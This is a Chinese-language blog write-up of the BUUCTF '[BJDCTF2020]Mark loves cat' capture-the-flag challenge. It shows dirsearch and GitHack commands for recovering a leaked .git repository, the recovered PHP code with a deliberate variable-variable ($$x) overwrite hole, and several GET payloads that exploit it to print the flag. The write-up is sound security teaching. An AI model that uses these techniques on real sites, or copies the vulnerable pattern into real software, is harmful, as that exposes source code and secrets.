# [BUUCTF [BJDCTF2020]Mark loves cat](https://www.cnblogs.com/darkcyan/p/17670106.html)

一进入环境，毫无头绪。  
使用`dirsearch`扫出了`/.git/`，可以猜出本关一定与git源码泄露有关。  
`python .\dirsearch.py -e * -u http://7cb1db04-980a-4af8-856b-7f6cd5ea231d.node4.buuoj.cn:81/ --timeout=2 -x 400,403,404,429,500,503`

[![](https://img2023.cnblogs.com/blog/2539847/202308/2539847-20230831152553252-1366874553.png)](https://img2023.cnblogs.com/blog/2539847/202308/2539847-20230831152553252-1366874553.png)

使用`GitHack`尝试从网站上扒出源码  
`python .\GitHack.py http://7cb1db04-980a-4af8-856b-7f6cd5ea231d.node4.buuoj.cn:81/.git`

[![](https://img2023.cnblogs.com/blog/2539847/202308/2539847-20230831152634212-647182840.png)](https://img2023.cnblogs.com/blog/2539847/202308/2539847-20230831152634212-647182840.png)

其中在flag.php找到：

```php
<?php
```

```php
$flag = file_get_contents('/flag');
```

其中在index.php末尾找到：

```php
<?php
```

```php
include 'flag.php';
```

```php
$yds = "dog";
```

```php
$is = "cat";
```

```php
$handsome = 'yds';
```

```php
foreach($_POST as $x => $y){
```

```php
    $$x = $y;
```

```php
}
```

```php
foreach($_GET as $x => $y){
```

```php
    $$x = $$y;
```

```php
}
```

```php
foreach($_GET as $x => $y){
```

```php
    # 存在(键值为flag的键值对)的值绝对等于这次比较的键值 且 这次键值不等于flag
```

```php
    if($_GET['flag'] === $x && $x !== 'flag'){
```

```php
        exit($handsome);
```

```php
    }
```

```php
}
```

```php
# 不存在键值为flag的键值对(get型) 且 不存在键值为flag的键值对(post型)
```

```php
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
```

```php
    exit($yds);
```

```php
}
```

```php
# 存在(flag,flag)(post型) 或 存在(flag,flag)(get型)
```

```php
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
```

```php
    exit($is);
```

```php
}
```

```php
echo "the flag is: ".$flag;
```

`exit`也是一种输出，我们需要执行到exit将flag值输出。

## 解法1：exit($handsome);[#](https://www.cnblogs.com/darkcyan/p/17670106.html#解法1exithandsome)

首先输出 handsome，就要将

handsome 的值转为$flag ，即`handsome=flag`  
并且为了满足条件，需要有键值为flag的键值对，即`flag=xxx`，改变flag的值需要改回来，所以`flag=a&a=flag`  
（flag=a不会将需要的flag值先给覆盖了吗？）  
payload1：`?handsome=flag&flag=a&a=flag`  
payload2：`?handsome=flag&flag=handsome`  
flag在页面源码底部`flag{e6908c89-a3ba-4212-b43b-2ceca40f2367}`

## 解法2：exit($yds);[#](https://www.cnblogs.com/darkcyan/p/17670106.html#解法2exityds)

GET,POST 都不输入flag键就可以，只需要将exit中的yds改为我们需要的

flag  
payload：`?yds=flag`

## 解法3：exit($is);[#](https://www.cnblogs.com/darkcyan/p/17670106.html#解法3exitis)

同样需要将exit中的is改为我们需要的

flag，同时满足if条件存在get型的(flag,flag)  
payload：`?is=flag&flag=flag`

> $不转义，显示有问题